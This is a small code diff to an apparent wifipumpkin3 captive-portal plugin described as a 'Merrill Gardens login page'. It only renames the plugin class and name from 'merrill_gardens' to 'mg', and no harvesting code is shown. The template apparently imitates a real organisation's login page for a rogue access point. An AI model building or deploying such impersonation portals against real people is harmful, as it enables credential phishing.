@@ -2,9 +2,9 @@
 from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
 import wifipumpkin3.core.utility.constants as C # import plugin class base
 
-class merrill_gardens(CaptiveTemplatePlugin):
+class mg(CaptiveTemplatePlugin):
     meta = {
-        'Name'      : 'merrill_gardens',
+        'Name'      : 'mg',
         'Version'   : '1.0',
         'Description' : 'Merrill Gardens login page',
         'Author'    : 'paxhumana',
